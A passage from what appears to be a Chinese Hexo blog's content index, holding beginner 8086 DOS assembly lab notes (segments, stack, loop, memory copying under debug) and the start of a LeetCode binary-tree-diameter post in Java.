class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">push ds:[0]</span><br><span class="line">push ds:[2]</span><br><span class="line"></span><br><span class="line">pop ds:[2]</span><br><span class="line">pop ds:[0]</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><ol><li>程序返回前,data段中的数据如下：</li></ol><p><img src= "/img/loading.gif" data-src="/posts/7fad3d80/1585098727870.png" alt></p><ol start="2"><li>程序返回前，cs = 076C, ss=076B,ds=076A</li><li>code段地址如果为X，data段地址为 X-32, stack段地址为X-16</li></ol><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0123h,0456h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">dw 0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">push ds:[0]</span><br><span class="line">push ds:[2]</span><br><span class="line"></span><br><span class="line">pop ds:[2]</span><br><span class="line">pop ds:[0]</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><ol><li>执行程序，返回前，data段中的数据为多少</li></ol><p><img src= "/img/loading.gif" data-src="/posts/7fad3d80/1585099444358.png" alt></p><ol start="2"><li>程序返回前，cs=076C,ss=076B,ds=076A</li><li>code段地址为X，data段地址为 X-32, stack段地址为 X- 16</li><li></li></ol><h3 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">a segment</span><br><span class="line">db 1,2,3,4,5,6,7,8</span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b segment</span><br><span class="line">db 1,2,3,4,5,6,7,8</span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">c segment</span><br><span class="line">db 0,0,0,0,0,0,0,0</span><br><span class="line">c ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">mov ax,a</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov ax,b</span><br><span class="line">mov ss,ax</span><br><span class="line"></span><br><span class="line">mov ax,c</span><br><span class="line">mov es,ax</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">mov bx,0</span><br><span class="line">mov dl,0</span><br><span class="line">s:</span><br><span class="line">add dl,ds:[bx]</span><br><span class="line">add dl,ss:[bx]</span><br><span class="line">mov es:[bx], dl</span><br><span class="line">mov dl,0</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>将a和b中的数据求和，放到c里面</p><p>执行完成后放在 es 中</p><p><img src= "/img/loading.gif" data-src="/posts/7fad3d80/1585101726819.png" alt></p><h3 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">a segment </span><br><span class="line">dw 1,2,3,4,5,6,7,8,9,0ah,0bh,0ch,0dh,0eh,0fh,0ffh</span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0</span><br><span class="line">b ends</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">mov ax,b</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,10h</span><br><span class="line"></span><br><span class="line">mov ax,a</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">mov bx,0</span><br><span class="line">s:</span><br><span class="line">mov dx,ds:[bx]</span><br><span class="line">push dx</span><br><span class="line">inc bx</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>将a中的前8个字型数据逆序压入到b中，(注意字型数据是小端存储的)</p><p><img src= "/img/loading.gif" data-src="/posts/7fad3d80/1585102355893.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土四</title>
      <link href="/posts/624f5fc5/"/>
      <url>/posts/624f5fc5/</url>
      
        <content type="html"><![CDATA[<p>BX 寄存器在内存寻址的作用</p><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847161633.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 2000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ax,[bx]  ; AX&#x3D;00BEH</span><br><span class="line">inc bx</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],ax  ; BX&#x3D;1002</span><br><span class="line">inc bx</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],ax  ; BX&#x3D;1004</span><br><span class="line">inc bx</span><br><span class="line">mov [bx],al  ; BX&#x3D;1005</span><br><span class="line">inc bx       </span><br><span class="line">mov [bx],al  ; BX&#x3D;1006</span><br></pre></td></tr></table></figure><p>最后得到的内存分布</p><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847171666.png" alt></p><h2 id="loop指令的使用"><a href="#loop指令的使用" class="headerlink" title="loop指令的使用"></a>loop指令的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line">mov cx,11</span><br><span class="line">s:  add ax,ax</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>cx 作为循环的计数器</p><p>计算乘法，123*236</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,236</span><br><span class="line">s:  add ax,123</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><blockquote><p>注意：在汇编程序中，数据不能以字母开头</p></blockquote><p><code>g</code> 指令可以直接执行到指定的位置</p><p><code>p</code> 会自动重复直到 <code>cx == 0</code> 为止</p><h2 id="Debug和masm对指令的不同处理"><a href="#Debug和masm对指令的不同处理" class="headerlink" title="Debug和masm对指令的不同处理"></a>Debug和masm对指令的不同处理</h2><p>在汇编源程序中，我们需要这么写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 2000h</span><br><span class="line">mov ds, ax</span><br><span class="line">mov al, ds:[0]</span><br></pre></td></tr></table></figure><p>如果没有指定段寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov al,[0]</span><br></pre></td></tr></table></figure><p>则 <code>masm</code> 理解成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0</span><br></pre></td></tr></table></figure><p>当然如果是寄存器的话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov al, [bx]</span><br></pre></td></tr></table></figure><p>则段寄存器默认存在是 ds</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>计算 <code>ffff:0 ~ ffff:b</code> 单元中的数据的和，结果存储在 dx 中</p><p>由于每一个数据都是字节的，不能直接加到16位的寄存器dx中，那么我们是不是可以用dh和dl呢，但是这样可能导致进位丢失</p><p>所以我们需要将8位的数据赋值到16位寄存器然后再与dx相加</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">0ffffh</span> <span class="comment">; 注意数字不能以字母开头</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0</span> <span class="comment">;首先让 ds:bx 指向 ffff:0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">dx</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">12</span> <span class="comment">;进行12次循环</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">s:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>,[<span class="built_in">bx</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="number">ah</span>,<span class="number">0</span>  <span class="comment">;不要忘记给ah置0！</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">dx</span>,<span class="built_in">ax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line">    <span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line">    <span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="如何使用内存空间"><a href="#如何使用内存空间" class="headerlink" title="如何使用内存空间"></a>如何使用内存空间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ds:[26h], ax</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>程序出问题了，无法继续运行</p><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847197500.png" alt></p><p>DOS方式下，一般情况，<code>0:200 ~ 0:2ff</code> 空间中没有系统或其他程序的数据或代码</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>将内存 ffff:0 ~ ffff:b 单元中的数据复制到 0:200 ~ 0:20b 单元中</p><p>可以将两个段的地址保存到两个寄存器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffh</span><br><span class="line">mov ds,ax </span><br><span class="line"></span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">mov cx,12</span><br><span class="line"></span><br><span class="line">s:  mov dl,[bx]</span><br><span class="line">mov es:[bx],dl</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>编程，向内存 0:200 ~0:23F 依次传送数据 0 ~63(3FH)</li></ol><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,200h</span><br><span class="line">mov cx,40h</span><br><span class="line">mov ax,0</span><br><span class="line">s:  mov [bx],ax</span><br><span class="line">inc ax</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847221964.png" alt></p><ol start="2"><li>编程，向内存 0:200~0:23F 一次传递数据 0~63(3FH),程序中只能使用9条指令<br>如果只能用9条指令，那么可以这么改<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,40h</span><br><span class="line">s:  mov [bx+200h],bx ;去掉了 ax，只用bx一个寄存器就可以做到</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>运行结果</li></ol><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847232334.png" alt></p><ol start="3"><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,20h</span><br><span class="line">s:  mov al,[bx]</span><br><span class="line">mov es:[bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li></ol><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847251042.png" alt></p><p>于是可以推测出 CX=17h</p><p>完整代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,17h</span><br><span class="line">s:  mov al,[bx]</span><br><span class="line">mov es:[bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/624f5fc5/1583847262812.png" alt></p><p>可以看到成功复制了</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土三</title>
      <link href="/posts/2e9d33db/"/>
      <url>/posts/2e9d33db/</url>
      
        <content type="html"><![CDATA[<h2 id="从汇编程序开始"><a href="#从汇编程序开始" class="headerlink" title="从汇编程序开始"></a>从汇编程序开始</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line"></span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">0123H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0456H</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">bx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00H</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21H</span></span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>伪指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">段名 segment</span><br><span class="line">段名 ends</span><br></pre></td></tr></table></figure><p><code>end</code> 和 <code>ends</code> 不一样， end标记整个程序的结束<br><code>assume</code> 将有特定用途的段和相关的段寄存器关联起来</p><p>程序返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure><p>编写代码，使用 MASM.exe 编译，然后使用 LINK.exe 进行链接</p><p><img src= "/img/loading.gif" data-src="/posts/2e9d33db/1583847029418.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/2e9d33db/1583847034341.png" alt></p><p>运行当然是没有结果的，我们需要使用 <code>debug</code> 调试</p><h2 id="可执行文件的加载过程"><a href="#可执行文件的加载过程" class="headerlink" title="可执行文件的加载过程"></a>可执行文件的加载过程</h2><p>程序加载的时候，找到一个段地址 <code>SA:0000</code>,程序从 <code>SA+10H:0000</code> 处开始运行，<code>SA</code> 存放在 ds寄存器中</p><p>刚加载进内存中时，</p><p><img src= "/img/loading.gif" data-src="/posts/2e9d33db/1583847094408.png" alt></p><p>此时看到 ds 寄存器的内容为 <code>075AH</code> ,所以程序的物理地址就是 ds+10h ,正好符合<br>在int21 时需要使用 p命令执行</p><p><img src= "/img/loading.gif" data-src="/posts/2e9d33db/1583847103427.png" alt></p><h2 id="实验3-编译链接跟踪"><a href="#实验3-编译链接跟踪" class="headerlink" title="实验3 编译链接跟踪"></a>实验3 编译链接跟踪</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">2000H</span>  <span class="comment">; AX=2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span>     <span class="comment">; SS=2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">0</span>      <span class="comment">; SP=0</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">sp</span>,<span class="number">10</span>     <span class="comment">; SP=10</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span>        <span class="comment">; SP=000CH, AX=076AH</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span>        <span class="comment">; SP=000EH, BX=7206H</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span>       <span class="comment">; SP=000CH</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span>       <span class="comment">; SP=000AH </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span>        <span class="comment">; AX=7c06H</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span>        <span class="comment">; BX=076AH</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00H</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21H</span></span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>PSP 的头两个字节是CD20,用debug加载，查看PSP的内容</p><p><img src= "/img/loading.gif" data-src="/posts/2e9d33db/1583847116112.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-二叉树的直径</title>
      <link href="/posts/c2fa82b5/"/>
      <url>/posts/c2fa82b5/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。</p><p>示例 :<br>给定二叉树</p><pre><code>    1   / \  2   3 / \     4   5    </code></pre><p>返回 3, 它的长度是路径 [4,2,1,3] 或者 [5,2,1,3]。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找到左子树的节点个数，右子树的节点个数，剩下的就好做了</p><p>我写了的lj代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> March;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 二叉树的直径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-03-10 20:02</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</span></span><br><span class="line"><span class="comment"> * 上面这个结果过不了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">diameterOfBinaryTree</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val;</span><br><span class="line">        TreeNode left;</span><br><span class="line">        TreeNode right;</span><br><span class="line">        TreeNode(<span class="keyword">int</span> x)&#123;</span><br><span class="line">            val = x;&#125;</span><br><span class="line">   